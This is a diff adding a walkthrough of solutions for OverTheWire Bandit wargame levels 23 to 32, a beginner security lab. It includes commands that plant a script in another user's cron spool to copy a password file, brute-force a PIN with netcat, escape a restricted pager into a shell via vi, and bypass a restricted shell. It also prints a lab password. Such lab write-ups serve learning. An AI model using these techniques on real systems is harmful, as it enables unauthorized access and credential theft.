@@ -111,4 +111,75 @@
     - ```echo I am user bandit23 | md5sum | awk '{print $1}' | xargs echo /tmp/ | sed 's/ //g' | xargs cat```
 
 - bandit23
-    -
+    - ```outpath=/tmp/catx```
+    - ```mkdir $outpath && touch $outpath/password.out && chmod 666 $outpath/password.out```
+    - ```echo -e '#!/bin/bash\n\ncat /etc/bandit_pass/bandit24 > /tmp/catx/password.out' > /var/spool/bandit24/getpass.sh && chmod 777 /var/spool/bandit24/getpass.sh```
+    - ``` cat $outpath/password.out```
+
+- bandit24
+    - ```passwd="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"; for i in $(seq 0000 9999); do echo $passwd $i; done | nc 127.0.0.1 30002 | grep -v secret | grep -v Wrong | xargs echo | awk '{print $8}'```
+
+- bandit25
+    - ```getent passwd | grep bandit26```
+    - ```cat /usr/bin/showtext```
+    - ```"minimize the terminal to show "more" on sshconnect"```
+    - ```ssh -i bandit26.sshkey bandit26@127.0.0.1```
+    - ```press v```
+    - ```on vi command, enter following commands:
+         :set shell=/bin/bash
+         :shell```
+    - ```find /etc/bandit_pass/ -type f -perm -400 -user bandit26 | xargs cat```
+
+- bandit26
+    - ```bandit27-do cat /etc/bandit_pass/bandit27```
+
+- bandit27
+    - ```mkdir /tmp/bandit27 && cd /tmp/bandit27```
+    - ```git clone ssh://bandit27-git@127.0.0.1/home/bandit27-git/repo```
+    - ```cat repo/README```
+
+- bandit28
+    - ```mkdir /tmp/bandit28 && cd /tmp/bandit28```
+    - ```git clone ssh://bandit28-git@127.0.0.1/home/bandit28-git/repo```
+    - ```cd repo && git log -p -1  grep -oe '\-\-.*:.*' | awk '{print $3}'```
+    - ```git show | grep password | tr -d '\n' | cut -d ' ' -f3```
+
+- bandit29
+    - ```mkdir /tmp/bandit29 && cd /tmp/bandit29```
+    - ```git clone ssh://bandit29-git@127.0.0.1/home/bandit29-git/repo```
+    - ```cd repo && git branch -a```
+    - ```git checkout remotes/origin/dev```
+    - ```git show | grep password | perl -p -e 's/\n//g' | awk '{print $8}'    # perl --help```
+
+- bandit30
+    - ```mkdir /tmp/bandit30 && cd /tmp/bandit30```
+    - ```git clone ssh://bandit30-git@127.0.0.1/home/bandit30-git/repo```
+    - ```cd repo && git tag -l```
+    - ```git show-ref```
+    - ```git show f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea```
+    - ```git tag -l```
+    - ```git show secret```
+
+- bandit31
+    - ```mkdir /tmp/bandit31 && cd /tmp/bandit31```
+    - ```git clone ssh://bandit31-git@127.0.0.1/home/bandit31-git/repo```
+    - ```git branch -a```
+    - ```git checkout master```
+    - ```echo 'May I come in?' > key.txt```
+    - ```git add -f key.txt```
+    - ```git commit -m 'upload'```
+    - ```git push origin master```
+
+- bandit32
+    - ```create a directory on bandit31 and symlink bash:```
+    - ```mkdir /tmp/B32/ && ln -sf /bin/bash /tmp/B32/BASH```
+    - ```login on ssh on bandit32:```
+    - ```/???/B32/BASH```
+    - ```/*/B32/BASH```
+    - ```cat /etc/bandit_pass/bandit32```
+- other solution:
+    - ```/*/B32/BASH```
+    - ```cat /etc/bandit_pass/bandit32```
+- another solution:
+    - ```$0```
+    - ```cat /etc/bandit_pass/bandit32```
